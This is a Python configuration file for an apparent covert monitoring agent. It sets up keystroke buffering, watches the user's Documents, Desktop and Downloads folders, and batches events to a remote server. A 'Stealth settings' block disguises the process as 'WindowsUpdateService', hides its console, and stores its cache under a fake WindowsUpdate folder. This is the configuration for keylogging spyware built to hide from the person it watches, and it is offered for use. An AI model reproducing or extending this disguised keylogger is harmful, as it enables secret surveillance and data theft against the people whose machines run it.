"""
Agent Configuration
"""
import os
import json
from pathlib import Path

# Server configuration
SERVER_URL = os.getenv('MONITOR_SERVER_URL', 'http://localhost:5000')
API_KEY = os.getenv('MONITOR_API_KEY', '')

# Agent settings
COMPUTER_NAME = os.getenv('COMPUTERNAME', 'UNKNOWN-PC')
USERNAME = os.getenv('USERNAME', 'unknown')

# Event batching
BATCH_SIZE = 50  # Events per batch
BATCH_INTERVAL = 5  # Seconds between batch sends
HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats

# Monitored directories for file watching
WATCHED_DIRECTORIES = [
    str(Path.home() / 'Documents'),
    str(Path.home() / 'Desktop'),
    str(Path.home() / 'Downloads'),
]

# Keystroke buffer settings
KEYSTROKE_BUFFER_SIZE = 50  # Characters before flushing
KEYSTROKE_BUFFER_TIMEOUT = 3  # Seconds before flushing

# Local cache settings
CACHE_DIR = Path(os.getenv('LOCALAPPDATA', '.')) / 'WindowsUpdate' / 'cache'
CACHE_MAX_SIZE = 10000  # Max cached events before oldest are dropped

# Stealth settings
PROCESS_NAME = 'WindowsUpdateService'  # Disguised process name
HIDE_CONSOLE = True
RUN_AS_SERVICE = False  # Set True for production

# Logging (disable in production)
DEBUG_MODE = os.getenv('MONITOR_DEBUG', 'false').lower() == 'true'


class AgentConfig:
    """Dynamic configuration loaded from config file"""
    
    _config_file = CACHE_DIR / 'config.json'
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._load_config()
        return cls._instance
    
    def _load_config(self):
        """Load configuration from file"""
        self.server_url = SERVER_URL
        self.api_key = API_KEY
        self.computer_id = None
        
        if self._config_file.exists():
            try:
                with open(self._config_file, 'r') as f:
                    data = json.load(f)
                    self.server_url = data.get('server_url', SERVER_URL)
                    self.api_key = data.get('api_key', API_KEY)
                    self.computer_id = data.get('computer_id')
            except Exception:
                pass
    
    def save_config(self):
        """Save configuration to file"""
        self._config_file.parent.mkdir(parents=True, exist_ok=True)
        with open(self._config_file, 'w') as f:
            json.dump({
                'server_url': self.server_url,
                'api_key': self.api_key,
                'computer_id': self.computer_id
            }, f)
    
    def update_credentials(self, api_key: str, computer_id: str):
        """Update API credentials after registration"""
        self.api_key = api_key
        self.computer_id = computer_id
        self.save_config()

